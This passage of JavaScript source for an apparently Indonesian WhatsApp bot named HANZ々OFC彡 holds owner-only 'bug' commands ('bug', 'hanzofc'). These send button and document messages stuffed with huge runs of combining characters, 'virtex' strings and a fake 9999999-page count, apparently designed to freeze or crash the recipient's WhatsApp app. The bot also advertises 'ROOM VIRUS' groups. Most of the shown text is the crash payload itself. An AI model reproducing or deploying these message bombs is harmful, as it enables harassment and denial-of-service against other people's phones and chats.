̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̵̸̡̨̛̛͇̻̬̥̖̘͍̣̰͖̰̻̗̖̙̙͙̞̙͓̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂̈́̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͘͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̷̷̴̧̧̧̡̧̛̛̛̼͓̞͈͖̲͎̙̞͎͖̙̩̘̣̯̦̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̈́̾͂́̔̉̉̍͑͌̍͋͗͐̂̐̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̚̕̕̕̚̕̚͜͝͡͝͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̣̯̦̲͎͍̓̈̇͑͌̍͋͗͐̂̐̚͜͜͡͝*̷̴̧̡̡̧̛̛̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̕̚̕̚͜͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̵̸̡̨̛̛͇̻̬̥̖̘̦͍̣̰͖̰̻̗̖̙̙͙̞̙͓̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂̈́̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͘͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̸̴̢̡̢̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̜̫̘̬̞͉̦͕̭̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̿̿̀̊̒́̀̌̂̔̍̓̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́͌̈̓͋̄̿̾͆̏̈̌̑̍̐̿̈́̈́͊̕̕̕͜͟͟͜͡͝͝͝͝͠ͅ?̵̷̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̣̯̦̲͎͂́̔̉̉̍͑͌̍͋͗͐̂̐̕̚͝͡͝*̷̴̧̡̧̛̛̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̕̚̕̚͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̵̸̡̨̛̛͇̻̬̥̖̘͍̣̰͖̰̻̗̖̙̙͙̞̙͓̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂̈́̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͘͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̷̷̴̧̧̧̡̧̛̛̛̼͓̞͈͖̲͎̙̞͎͖̙̩̘̣̯̦̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̈́̾͂́̔̉̉̍͑͌̍͋͗͐̂̐̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̚̕̕̕̚̕̚͜͝͡͝͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̣̯̦̲͎͍̓̈̇͑͌̍͋͗͐̂̐̚͜͜͡͝*̷̴̧̡̡̧̛̛̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̕̚̕̚͜͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̵̸̡̨̛̛͇̻̬̥̖̘̦͍̣̰͖̰̻̗̖̙̙͙̞̙͓̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂̈́̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͘͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̸̴̢̡̢̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̜̫̘̬̞͉̦͕̭̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̿̿̀̊̒́̀̌̂̔̍̓̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́͌̈̓͋̄̿̾͆̏̈̌̑̍̐̿̈́̈́͊̕̕̕͜͟͟͜͡͝͝͝͝͠ͅ?̵̷̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̣̯̦̲͎͂́̔̉̉̍͑͌̍͋͗͐̂̐̕̚͝͡͝*̷̴̧̡̧̛̛̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̕̚̕̚͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̵̸̡̨̛̛͇̻̬̥̖̘͍̣̰͖̰̻̗̖̙̙͙̞̙͓̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂̈́̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͘͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̷̷̴̧̧̧̡̧̛̛̛̼͓̞͈͖̲͎̙̞͎͖̙̩̘̣̯̦̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̈́̾͂́̔̉̉̍͑͌̍͋͗͐̂̐̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̚̕̕̕̚̕̚͜͝͡͝͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̣̯̦̲͎͍̓̈̇͑͌̍͋͗͐̂̐̚͜͜͡͝*̷̴̧̡̡̧̛̛̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̕̚̕̚͜͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̵̸̡̨̛̛͇̻̬̥̖̘̦͍̣̰͖̰̻̗̖̙̙͙̞̙͓̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂̈́̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͘͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̸̴̢̡̢̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̜̫̘̬̞͉̦͕̭̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̿̿̀̊̒́̀̌̂̔̍̓̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́͌̈̓͋̄̿̾͆̏̈̌̑̍̐̿̈́̈́͊̕̕̕͜͟͟͜͡͝͝͝͝͠ͅ?̵̷̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̣̯̦̲͎͂́̔̉̉̍͑͌̍͋͗͐̂̐̕̚͝͡͝*̷̴̧̡̧̛̛̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̕̚̕̚͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̵̸̡̨̛̛͇̻̬̥̖̘͍̣̰͖̰̻̗̖̙̙͙̞̙͓̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂̈́̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͘͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̷̷̴̧̧̧̡̧̛̛̛̼͓̞͈͖̲͎̙̞͎͖̙̩̘̣̯̦̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̈́̾͂́̔̉̉̍͑͌̍͋͗͐̂̐̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̚̕̕̕̚̕̚͜͝͡͝͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̣̯̦̲͎͍̓̈̇͑͌̍͋͗͐̂̐̚͜͜͡͝*̷̴̧̡̡̧̛̛̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̕̚̕̚͜͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡.pdf`, pageCount: 9999999 }, [{buttonId:`!000`,buttonText:{displayText:'HANZ々OFC彡'},type:1}], {quoted:mek, contextInfo: { mentionedJid: [dtod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${ownername}`,mediaType:"2",thumbnail:virgam,mediaUrl:`https://youtu.be/x-O0WHkv3uc`}}})
break   
//ᗷᑌᘜ ᗷᑌTTOᑎ ᒪOKᗩՏI ᐯ2     
case 'bug':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')			
res = await Hanz.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": -6.105394271969506,
						"degreesLongitude": 106.71700716018677
					 },
						"contentText": `❏HANZ々OFC彡❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
╔═════════════════⎉
║冬Nama Bot : ${botname}
║冬Nama Owner : ${ownername}
║冬Nomor Owner : ${owner}
║冬Creator : ${creator}
║冬Mode : ${publik ? 'Public' : 'Self'}
║冬Runtime : ${runtime(process.uptime())}
║冬Prefix : Multi
║冬Battery : ${baterai.battery}
║冬Charged : ${baterai.isCharge ? 'Cas' : 'Tidak'}
║冬Autoread pc : ${readP ? 'On' : 'Off'}
║冬Autoread gc : ${readG ? 'On' : 'Off'}
║冬Auto Ketik : ${ngetik ? 'On' : 'Off'}
║冬Auto Recording : ${autovn ? 'On' : 'Off'}
╚═════════════════❍ 
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
YUK JOIN ALL GROUP AKU

GROUP HANZ々OFC彡[INFO]
https://chat.whatsapp.com/JPrMnQZao82D6bEeZKBNQ2

GROUP HANZ々OFC彡[BOT WA]
https://chat.whatsapp.com/H2dvuYaI3SbKURzstwl7Wn

ROOM VIRUS 1/2
V1: https://chat.whatsapp.com/GsG7Dvu6ymPL3wqHubftIG

V2: https://chat.whatsapp.com/CuVbS5XaimTIl4LuKTahYq
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "HANZ々OFC彡",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` ${virtex2(prefix)}${virtex9(prefix)}${virtex5(prefix)}${virtex9(prefix)}${ngazap(prefix)}ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break        
//BUG BUTTON V2
case 'hanzofc':
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
					res =  Hanz.prepareMessageFromContent(from,{
				"buttonsMessage": {
						"text": "",
						"contentText": "HANZ々OFC彡",
						"footerText": `BUGBOT RASA CACING🗿`,
						"buttons": [
							{
								"buttonId": "By:Hanz-Ofc",
								"buttonText": {
									"displayText": `${virtex2(prefix)}${virtex5(prefix)}${virtex9(prefix)}${ngazap(prefix)}ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ